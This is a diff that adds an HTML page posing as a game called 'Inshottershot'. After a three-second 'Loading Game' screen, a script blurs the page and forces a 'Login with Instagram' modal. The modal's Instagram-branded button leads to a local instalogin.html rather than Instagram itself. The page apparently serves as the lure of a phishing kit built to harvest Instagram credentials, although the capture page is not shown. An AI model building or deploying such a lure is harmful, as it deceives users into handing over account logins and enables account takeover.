@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Inshottershot – Game</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    .blurred {
+      filter: blur(3px);
+    }
+  </style>
+</head>
+<body class="bg-gradient-to-br from-black via-purple-900 to-black text-white min-h-screen flex flex-col items-center justify-center relative px-4 pt-6">
+
+  <!-- Game Intro Content -->
+  <div id="main-content" class="text-center transition-all duration-500 max-w-md w-full">
+    <h1 class="text-3xl sm:text-4xl font-bold mb-4">Welcome to Inshottershot 🎮</h1>
+    <p class="text-base sm:text-lg text-gray-300">Get ready to prove your skills!</p>
+    <div class="mt-10 animate-bounce">
+      <span class="text-xl sm:text-2xl">🚀 Loading Game...</span>
+    </div>
+  </div>
+
+  <!-- Instagram Login Modal -->
+  <div id="login-modal" class="hidden fixed inset-0 bg-black bg-opacity-70 flex items-center justify-center z-50 px-4">
+    <div class="bg-white text-black rounded-2xl p-6 sm:p-8 w-full max-w-sm text-center shadow-2xl">
+      <h2 class="text-xl sm:text-2xl font-bold mb-3 sm:mb-4">Login Required</h2>
+      <p class="text-sm sm:text-base mb-5 sm:mb-6">Please login with Instagram to continue</p>
+
+     <a href="instalogin.html" class="inline-flex items-center justify-center gap-2 bg-gradient-to-r from-pink-500 to-purple-600 text-white px-5 py-2 rounded-full font-semibold hover:scale-105 transition text-sm sm:text-base">
+  <svg xmlns="http://www.w3.org/2000/svg" class="w-5 h-5 fill-current" viewBox="0 0 24 24">
+    <path d="M7.75 2h8.5A5.76 5.76 0 0 1 22 7.75v8.5A5.76 5.76 0 0 1 16.25 22h-8.5A5.76 5.76 0 0 1 2 16.25v-8.5A5.76 5.76 0 0 1 7.75 2zm0 2A3.76 3.76 0 0 0 4 7.75v8.5A3.76 3.76 0 0 0 7.75 20h8.5A3.76 3.76 0 0 0 20 16.25v-8.5A3.76 3.76 0 0 0 16.25 4h-8.5zM12 7a5 5 0 1 1 0 10 5 5 0 0 1 0-10zm0 2a3 3 0 1 0 0 6 3 3 0 0 0 0-6zm5.25-2a.75.75 0 1 1 0 1.5.75.75 0 0 1 0-1.5z"/>
+  </svg>
+  Login with Instagram
+</a>
+
+    </div>
+  </div>
+
+  <!-- Script for Modal Trigger -->
+  <script>
+    setTimeout(() => {
+      document.getElementById("login-modal").classList.remove("hidden");
+      document.getElementById("main-content").classList.add("blurred");
+    }, 3000);
+  </script>
+
+</body>
+</html>
